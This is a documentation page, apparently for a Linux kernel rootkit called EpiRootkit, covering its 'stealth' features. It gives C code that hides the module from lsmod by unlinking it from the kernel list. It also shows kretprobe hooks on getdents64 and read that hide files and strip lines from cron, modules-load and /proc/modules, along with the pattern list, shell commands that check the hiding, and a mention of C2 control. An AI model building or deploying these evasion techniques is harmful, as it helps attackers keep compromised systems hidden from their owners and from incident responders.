---
title: "Stealth & Hiding"
description: "Module hiding, file hiding and line hiding capabilities"
icon: "visibility_off"
date: "2025-05-25T00:00:00+01:00"
lastmod: "2025-05-30T00:00:00+01:00"
draft: false
toc: true
weight: 512
---

# Stealth & Hiding

Three stealth mechanisms to hide the rootkit from system detection using kernel hooking techniques.

## Module Hiding

Hide the rootkit module from `lsmod` and `/proc/modules` by removing it from the kernel's module list.

### Implementation
```c
int hide_module(void)
{
    if (stealth_state.module_hidden) return 0;

    stealth_state.prev_module_entry = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    stealth_state.module_hidden = true;
    return 0;
}
```

**How it works**: Removes module from kernel's linked list using `list_del()`.

## File Hiding

Hide files with specific prefixes from directory listings by hooking the `getdents64` syscall.

### Implementation
```c
stealth_state.getdents_probe = (struct kretprobe) {
    .kp.symbol_name = "ksys_getdents64",
    .handler = getdents64_ret_handler,
    .entry_handler = getdents64_entry_handler,
    .maxactive = 20
};
```

**How it works**: Intercepts directory reads and filters out files matching hidden prefixes.

## Line Hiding

Hide rootkit-related lines from file content when users read system files.

### Implementation
```c
stealth_state.read_probe = (struct kretprobe) {
    .kp.symbol_name = "ksys_read",
    .handler = read_ret_handler,
    .entry_handler = read_entry_handler,
    .maxactive = 20
};
```

**How it works**: Hooks `ksys_read` syscall and filters lines containing rootkit patterns.

### Target Patterns
```c
static const char * const line_hide_patterns[] = {
    "epirootkit",
    "jules_est_bo_",
    "EpiRootkit",
    "modprobe epirootkit",
    "insmod"
};
```

### Target Directories
- `/etc/cron.d/`
- `/etc/modules-load.d/`
- `/etc/profile.d/`
- `/proc/modules`

## Usage

### WebUI Control
**[Configuration Panel](../../04-web-ui/features/panels/configuration-panel.md)** provides:
- **Module Hiding** toggle with real-time status
- **File Hiding** toggle with real-time status  
- **Line Hiding** toggle with real-time status
- Visual indicators for current state

### Testing File Hiding
```bash
# Create test files
touch /tmp/epirootkit_test /tmp/normal_file

# Check visibility (file hiding enabled)
ls /tmp/
# Shows: normal_file (epirootkit_test hidden)
```

### Testing Line Hiding
```bash
# Create test file with rootkit patterns
echo -e "normal line\nepirootkit module\nother line" > /etc/cron.d/test

# Read file (line hiding enabled)
cat /etc/cron.d/test
# Shows: normal line
#         other line
```

All stealth features are **enabled by default** and can be toggled dynamically via WebUI or C2 commands.